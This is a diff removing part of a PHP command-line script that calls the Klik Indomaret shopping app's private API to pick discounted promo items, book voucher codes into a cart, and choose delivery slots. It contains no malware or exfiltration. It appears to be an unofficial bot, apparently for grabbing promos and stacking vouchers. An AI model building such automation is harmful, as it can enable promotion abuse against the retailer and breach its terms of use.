-							break;
-						}
-					}
-					echo "\n";
-					echo "Promo 5 :\n";
-					$e1 = "0";
-					$e2 = "10";
-					for ($e1; $e1 < $e2; $e1++) {
-						$district = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][$e1]["Product"]["Description"];
-						$hargadis = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][$e1]["PriceWithDiscount"];
-						$setoke = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][$e1]["AvailableQuantityStock"];
-						echo @color('nevy', "[{$e1}]");
-						echo "=> ";
-						echo @color('yellow', "{$district}");
-						echo @color('green', " : {$hargadis}");
-						echo @color('nevy', " =>> {$setoke}");
-						echo "\n";
-						if ($district == "") {
-							break;
-						}
-					}
-					oketambahlah:
-					echo @color("yellow", "PILIH PROMO : \n");
-					echo @color("yellow", "[0] PROMO 0 \n");
-					echo @color("yellow", "[1] PROMO 1 \n");
-					echo @color("yellow", "[2] PROMO 2 \n");
-					echo @color("yellow", "[3] PROMO 3 \n");
-					echo @color("yellow", "[4] PROMO 4 \n");
-					echo @color("yellow", "[5] PROMO 5 \n");
-					echo @color("yellow", "Pilih : ");
-					$pilihlabro = trim(fgets(STDIN));
-					if ($pilihlabro == "0") {
-						goto tabnol;
-					} elseif ($pilihlabro == "1") {
-						goto tabsatu;
-					} elseif ($pilihlabro == "2") {
-						goto tabdua;
-					} elseif ($pilihlabro == "3") {
-						goto tabtiga;
-					} elseif ($pilihlabro == "4") {
-						goto tabempat;
-					} elseif ($pilihlabro == "5") {
-						goto tablima;
-					}
-					tabnol:
-					echo @color("yellow", "PILIH BARANG : ");
-					$pilihlayuk = trim(fgets(STDIN));
-					if ($pilihlayuk == "0") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][0]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][0]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "1") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][1]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][1]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "2") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][2]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][2]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "3") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][3]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][3]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "4") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][4]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][4]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "5") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][5]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][5]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "6") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][6]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][6]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "7") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][7]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][7]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "8") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][8]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][8]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "9") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][9]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][9]["Product"]["PLU"];
-						goto selectnya;
-					}
-					tabsatu:
-					echo @color("yellow", "PILIH BARANG : ");
-					$pilihlayuk = trim(fgets(STDIN));
-					if ($pilihlayuk == "0") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][0]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][0]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "1") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][1]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][1]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "2") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][2]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][2]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "3") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][3]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][3]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "4") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][4]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][4]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "5") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][5]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][5]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "6") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][6]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][6]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "7") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][7]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][7]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "8") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][8]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][8]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "9") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][9]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][9]["Product"]["PLU"];
-						goto selectnya;
-					}
-					tabdua:
-					echo @color("yellow", "PILIH BARANG : ");
-					$pilihlayuk = trim(fgets(STDIN));
-					if ($pilihlayuk == "0") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][0]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][0]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "1") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][1]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][1]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "2") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][2]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][2]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "3") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][3]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][3]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "4") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][4]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][4]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "5") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][5]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][5]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "6") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][6]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][6]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "7") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][7]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][7]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "8") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][8]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][8]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "9") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][9]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][9]["Product"]["PLU"];
-						goto selectnya;
-					}
-					tabtiga:
-					echo @color("yellow", "PILIH BARANG : ");
-					$pilihlayuk = trim(fgets(STDIN));
-					if ($pilihlayuk == "0") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][0]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][0]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "1") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][1]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][1]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "2") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][2]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][2]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "3") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][3]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][3]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "4") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][4]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][4]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "5") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][5]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][5]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "6") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][6]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][6]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "7") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][7]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][7]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "8") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][8]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][8]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "9") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][9]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][9]["Product"]["PLU"];
-						goto selectnya;
-					}
-					tabempat:
-					echo @color("yellow", "PILIH BARANG : ");
-					$pilihlayuk = trim(fgets(STDIN));
-					if ($pilihlayuk == "0") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][0]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][0]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "1") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][1]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][1]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "2") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][2]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][2]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "3") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][3]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][3]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "4") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][4]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][4]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "5") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][5]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][5]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "6") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][6]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][6]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "7") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][7]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][7]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "8") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][8]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][8]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "9") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][9]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][9]["Product"]["PLU"];
-						goto selectnya;
-					}
-					tablima:
-					echo @color("yellow", "PILIH BARANG : ");
-					$pilihlayuk = trim(fgets(STDIN));
-					if ($pilihlayuk == "0") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][0]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][0]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "1") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][1]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][1]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "2") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][2]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][2]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "3") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][3]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][3]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "4") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][4]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][4]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "5") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][5]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][5]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "6") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][6]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][6]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "7") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][7]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][7]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "8") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][8]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][8]["Product"]["PLU"];
-						goto selectnya;
-					} elseif ($pilihlayuk == "9") {
-						$promocodeee = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][9]["PromoCode"];
-						$plutuak = @$ajgjuga[0]["CartItemNotification"]["Items"][5]["ShoppingCartItems"][9]["Product"]["PLU"];
-						goto selectnya;
-					}
-					selectnya:
-					echo @color("yellow", "JUMLAH ? : ");
-					$qtytebus = trim(fgets(STDIN));
-					//if($pilihlajon == "1"){
-					$tebus = getRequestt("https://api.klikindomaret.com/api/ShoppingCart/SetPromoSelect?ShoppingCartID=" . $SCID . "&promoCode=" . $promocodeee . "&plu=" . $plutuak . "&quantity=" . $qtytebus . "&isSelect=true");
-					$ajg = json_decode($tebus, true);
-					$kntl = @$ajg[0]["Message"];
-					echo @color("green", $kntl);
-					echo @color("green", " MENAMBAHKAN TEBUS MURAH");
-					echo "\n";
-					echo @color("yellow", "TAMBAH TEBUS MURAH LAGI ? ( y / n ) : ");
-					$tambalhabae = trim(fgets(STDIN));
-					echo "\n";
-					if ($tambalhabae == "y") {
-						goto oketambahlah;
-					}
-					tanpatebus:
-					if ($json[0]->CartItemNotification->ListCouponPotonganTotal == []) {
-						echo @color('red', "KUPON KOSONG KAK\n");
-					} else {
-						$jumlah = count($json[0]->CartItemNotification->ListCouponPotonganTotal);
-						echo @color('yellow', "JUMLAH KUPON NEMPEL : ");
-						echo @color('green', "{$jumlah}\n");
-						foreach ($json[0]->CartItemNotification->ListCouponPotonganTotal as $mydata) {
-							$kupon = $mydata->CouponMask;
-							$desk = $mydata->CouponMekanisme;
-							//echo "Nama Kupon : $kupon\n";
-							echo @color('yellow', "Nama Kupon   : ");
-							echo @color('green', "{$kupon}\n");
-							echo @color('yellow', "Keterangan   : ");
-							echo @color('blue', "{$desk}\n");
-						}
-					}
-					echo @color('yellow', "LANJUT(y / n )? ");
-					$againex = trim(fgets(STDIN));
-					if (strtolower($againex) == 'n') {
-						goto pilihproduk;
-					}
-					inputvocer:
-					echo @color('blue', "Tempel kupon : ");
-					echo @color('nevy', "{$vocer}\n");
-					$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . $DEVICE_ID . '","ShoppingCartPackageID":null}';
-					$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-					$kimak = json_decode($kupon[1]);
-					$ket = $kimak->ResponseObject->keterangan;
-					if (strpos($kupon[1], '"status":"SUCCESS"')) {
-						echo @color('green', "BERHASIL GAN\n");
-						echo @color('nevy', "{$ket}\n");
-						echo @color('blue', "{$nomor}\n");
-					} else {
-						echo @color('red', "{$ket}\n");
-					}
-					echo @color('yellow', "INPUT VOCER LAGI ? (y / n ) ");
-					$againexa = trim(fgets(STDIN));
-					if (strtolower($againexa) == 'y') {
-						echo @color('yellow', "Masukkan Vocer : ");
-						$vocernew = trim(fgets(STDIN));
-						$datane = '{"Code":"' . $vocernew . '","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . $DEVICE_ID . '","ShoppingCartPackageID":null}';
-						$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-						$kimak = json_decode($kupon[1]);
-						$ket = $kimak->ResponseObject->keterangan;
-						if (strpos($kupon[1], '"status":"SUCCESS"')) {
-							echo @color('green', "BERHASIL GAN\n");
-							echo @color('nevy', "{$ket}\n");
-							echo @color('blue', "{$nomor}\n");
-						} else {
-							echo @color('red', "{$ket}\n");
-						}
-					}
-					switch ($ambil) {
-						case '1':
-							$ceksk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$gettime = curlx('https://api.klikindomaret.com/api/Setting/Get?SettingKey=STORE_PREPARATION_TIME', null, $kuntul);
-							$gett = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-							$addidx = json_decode($gett[1]);
-							$addid = $addidx[0]->ID;
-							$ZipCode = $addidx[0]->ZipCode;
-							$DistrictId = $addidx[0]->DistrictId;
-							$getmboh = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetShippingMethod/' . $SCID . '?customerId=' . $ID . '&isVIrtual=false&regionID=' . $RegionId . '&CustomerAddressID=00000000-0000-0000-0000-000000000000&IsParcelView=false&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$ceksek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$poss = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$cekasek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$poss2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possas = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possass = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possaa = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$jsone = json_decode($possaa[1]);
-							$ax1 = "0";
-							$ax2 = "7";
-							echo @color('yellow', "TANGGAL : \n");
-							for ($ax1; $ax1 < $ax2; $ax1++) {
-								$tanggale = $jsone->ResponseObject->ListSlot[$ax1]->DateLabel;
-								$tanggalex = $jsone->ResponseObject->ListSlot[$ax1]->DateDayLabel;
-								echo @color('nevy', "[{$ax1}]");
-								echo "=> ";
-								echo @color('yellow', "{$tanggale}");
-								echo "\n";
-								if ($tanggale == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "PILIH : ");
-							$tglee = trim(fgets(STDIN));
-							switch ($tglee) {
-								case '0':
-									$tgle = $jsone->ResponseObject->ListSlot[0]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[0]->DateLabel;
-									break;
-								case '1':
-									$tgle = $jsone->ResponseObject->ListSlot[1]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[1]->DateLabel;
-									break;
-								case '2':
-									$tgle = $jsone->ResponseObject->ListSlot[2]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[2]->DateLabel;
-									break;
-								case '3':
-									$tgle = $jsone->ResponseObject->ListSlot[3]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[3]->DateLabel;
-									break;
-								case '4':
-									$tgle = $jsone->ResponseObject->ListSlot[4]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[4]->DateLabel;
-									break;
-								case '5':
-									$tgle = $jsone->ResponseObject->ListSlot[5]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[5]->DateLabel;
-									break;
-							}
-							$jumuke = explode('T', $tgle);
-							$tgljmk = $jumuke[0];
-							echo @color('yellow', "{$tagalex}\n");
-							$axx1 = "0";
-							$axx2 = "14";
-							echo @color('yellow', "JAM ANTAR :\n");
-							for ($axx1; $axx1 < $axx2; $axx1++) {
-								$xs = $axx1 + 1;
-								$jame = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->SlotLabel;
-								$pesane = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->Message;
-								echo @color('nevy', "[{$xs}]");
-								echo "=> ";
-								echo @color('yellow', "{$jame}, ");
-								echo @color('red', "{$pesane}");
-								echo "\n";
-								if ($jame == "") {
-									break;
-								}
-							}
